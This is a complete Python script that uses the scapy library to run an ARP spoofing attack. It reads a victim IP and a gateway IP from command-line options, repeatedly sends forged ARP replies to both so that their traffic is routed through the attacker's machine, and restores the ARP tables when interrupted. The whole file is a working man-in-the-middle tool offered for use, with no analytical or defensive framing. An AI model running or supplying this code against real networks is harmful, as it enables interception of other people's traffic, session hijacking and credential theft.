#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-v", "-t", dest="victim_ip", help="Target/Victim IP")
    parser.add_option("-r", "-g", dest="router_ip", help="Router/Gateway IP")
    (options, arguments) = parser.parse_args()
    if not options.victim_ip:
        parser.error("[-] Please specify Victim/Target IP")
    elif not options.router_ip:
        parser.error("[-] Please specify Router/Gateway IP")

    return options


def mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_rb = broadcast/arp_req
    ans = scapy.srp(arp_rb, timeout=1, verbose=False)[0]

    return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)    # use scapy.ls(scapy.ARP()) to get details of the parameters
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=mac(dst_ip), psrc=src_ip, hwsrc=mac(src_ip))
    scapy.send(packet, count=4, verbose=False)


options = get_args()

victim_ip = options.victim_ip
router_ip = options.router_ip

try:
    packets_count = 0
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        packets_count = packets_count+ 2
        print("\r[+] Packets sent: " + str(packets_count)),  # , end="") for python3 remove sys and use this
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Resetting ARP tables.....")
    restore(victim_ip, router_ip)
    restore(router_ip, victim_ip)
